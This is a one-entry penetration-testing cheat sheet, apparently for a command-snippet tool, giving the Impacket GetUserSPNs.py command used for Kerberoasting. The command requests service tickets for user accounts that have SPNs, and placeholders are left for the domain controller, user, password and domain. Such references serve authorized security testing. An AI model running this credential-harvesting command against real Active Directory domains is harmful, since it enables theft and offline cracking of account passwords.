# Kerberos

## Find SPN that are associated with a normal user account (Kerberoast) 

```
GetUserSPNs.py -request -dc-ip <domain-controller> <domain>/<user>:'<password>'
```

= domain-controller: $DC
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
